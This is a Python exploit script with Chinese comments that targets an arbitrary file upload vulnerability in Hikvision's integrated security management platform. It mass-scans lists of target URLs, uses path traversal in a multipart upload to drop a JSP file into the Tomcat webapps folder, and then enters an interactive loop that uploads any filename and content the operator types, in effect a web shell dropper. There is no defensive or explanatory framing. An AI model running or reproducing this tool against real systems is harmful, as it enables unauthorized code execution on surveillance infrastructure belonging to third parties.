#海康威视 综合安防管理平台软件 files;.js 任意文件上传漏洞

import argparse,requests,sys,time,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m' #输出颜色
RESET = '\033[0m'

def banner():
    text = '''
███████╗██╗██╗     ███████╗    ██╗   ██╗██████╗ ██╗      █████╗  ██████╗ ██████╗ 
██╔════╝██║██║     ██╔════╝    ██║   ██║██╔══██╗██║     ██╔══██╗██╔═══██╗██╔══██╗
█████╗  ██║██║     █████╗      ██║   ██║██████╔╝██║     ███████║██║   ██║██║  ██║
██╔══╝  ██║██║     ██╔══╝      ██║   ██║██╔═══╝ ██║     ██╔══██║██║   ██║██║  ██║
██║     ██║███████╗███████╗    ╚██████╔╝██║     ███████╗██║  ██║╚██████╔╝██████╔╝
╚═╝     ╚═╝╚══════╝╚══════╝     ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝                                                ░                                ░        
                                            version:HKWS_file_js_fileupload 1.0
                                                       author:Hardog
'''
    print(text)
def main():
    banner()
    #设置参数
    parser = argparse.ArgumentParser(description="海康威视 综合安防管理平台软件 files;.js 任意文件上传漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help="input your url")
    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
    args = parser.parse_args()
    #处理资产，添加线程
    if args.url and not args.file:
        # poc(args.url)
        if poc(args.url):
            exp(args.url)
    elif not args.url and args.file:
        url_list = []
        with open('url.txt','r',encoding='utf-8')as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    url_payload = '/center/api/files;.js'
    url = target + url_payload
    # print(url)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 SE 2.X MetaSr 1.0", 
        "Cache-Control": "no-cache", 
        "Content-Type": "multipart/form-data; boundary=e0e1d419983f8f0e95c2d9ccf9b54e488353b5db7bac34b1a973ea9d0f0f", 
        "Pragma": "no-cache", 
        "Accept-Encoding": "gzip, deflate, br", 
        "Connection": "close"
        }
    data = "--e0e1d419983f8f0e95c2d9ccf9b54e488353b5db7bac34b1a973ea9d0f0f\r\nContent-Disposition: form-data; name=\"file\"; filename=\"../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/test.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n<%out.println(\"11223344\");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n--e0e1d419983f8f0e95c2d9ccf9b54e488353b5db7bac34b1a973ea9d0f0f--"
    proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

    try:
        response = requests.post(url=url,headers=headers,data=data,proxies=proxies,timeout=5)
        # match = re.search('"data":\s*{"id":\d+,"path":"([^"]+)"',response.text)
        result = target + '/clusterMgr/test.jsp;.js'
        if response.status_code == 200 and "filename" in response.text:
            print( f"{GREEN}[+] {target} 存在文件上传漏洞！\n[+] 访问：{result} \n{RESET}")
            with open('result.txt','a',encoding='utf-8')as f:
                f.write(target + '\n')
                return True
        else:
            print("[-] 不存在漏洞！！")
            return False
    except Exception:
        pass

def exp(target):
    print("--------------正在进行漏洞利用------------")
    time.sleep(2)

    while True:
        filename = input('请输入文件名：')
        code = input('请输入文件的内容：')
        if filename == 'q' or code == 'q':
            print("正在退出,请等候……")
            break
        #给文件设置变量
        url_payload = '/center/api/files;.js'
        url = target + url_payload
    # print(url)
        headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 SE 2.X MetaSr 1.0", 
        "Cache-Control": "no-cache", 
        "Content-Type": "multipart/form-data; boundary=e0e1d419983f8f0e95c2d9ccf9b54e488353b5db7bac34b1a973ea9d0f0f", 
        "Pragma": "no-cache", 
        "Accept-Encoding": "gzip, deflate, br", 
        "Connection": "close"
        }
        data = "--e0e1d419983f8f0e95c2d9ccf9b54e488353b5db7bac34b1a973ea9d0f0f\r\nContent-Disposition: form-data; name=\"file\"; filename=\"../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/" + f"{filename}" + "\"\r\nContent-Type: application/octet-stream\r\n\r\n"+ f"{code}" + "\r\n--e0e1d419983f8f0e95c2d9ccf9b54e488353b5db7bac34b1a973ea9d0f0f--"
        try:
            response = requests.post(url=url,headers=headers,data=data,timeout=5)
            result1 = target + f'/clusterMgr/{filename};.js'
            print(result1)
            if response.status_code == 200 and "filename" in response.text:
                print( f"{GREEN}[+] {target} 存在文件上传漏洞！\n[+] 访问：{result1} \n{RESET}")
                with open('result.txt','a',encoding='utf-8')as f:
                    f.write(target + '\n')
                    return True
            else:
                print("[-] 不存在漏洞！！")
                return False
        except Exception:
            pass

        
if __name__ == '__main__':
    main()
